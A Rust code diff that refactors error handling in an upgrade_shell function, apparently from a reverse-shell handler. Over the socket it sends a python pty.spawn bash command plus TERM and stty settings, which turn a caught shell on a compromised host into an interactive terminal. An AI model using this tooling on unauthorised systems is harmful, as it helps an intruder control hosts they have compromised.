@@ -2,17 +2,16 @@ use tokio::net::tcp::{OwnedWriteHalf, OwnedReadHalf};
 use tokio::io::AsyncWriteExt;
 use terminal_size::{Width, Height, terminal_size};
 
-pub async fn upgrade_shell(_reader: &mut OwnedReadHalf, writer: &mut OwnedWriteHalf) {
+pub async fn upgrade_shell(_reader: &mut OwnedReadHalf, writer: &mut OwnedWriteHalf) -> Result<(), String> {
     // launch /bin/bash with python
     match writer.write_all(b"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n").await {
         Ok(_)  => {},
-        Err(_) => eprintln!("Failed to initialize reverse shell."),
-    }
+        Err(_) => return Err("Failed to initialize reverse shell.".to_string()), }
 
     // set TERM env variable
     match writer.write_all(b"export TERM=xterm-256color\n").await {
-        Ok(_)  => println!("Set XTERM variable"),
-        Err(_) => eprintln!("Failed to set XTERM variable."),
+        Ok(_)  => {},
+        Err(_) => return Err("Failed to set XTERM variable.".to_string()),
     }
 
     // Set Terminal size with `stty`
@@ -24,10 +23,12 @@ pub async fn upgrade_shell(_reader: &mut OwnedReadHalf, writer: &mut OwnedWriteH
         let stty_command = format!("stty rows {} cols {}\n", h, w);
 
         match writer.write_all(stty_command.as_bytes()).await {
-            Ok(_)  => println!("Define terminal size with stty"),
-            Err(_) => eprintln!("Failed to write stty command to socket."),
+            Ok(_)  => {},
+            Err(_) => return Err("Failed to write stty command to socket.".to_string()),
         }
     } else {
-        eprintln!("Failed to obtain terminal size");
-    }   
+        return Err("Failed to obtain terminal size".to_string());
+    }
+
+    Ok(())
 }
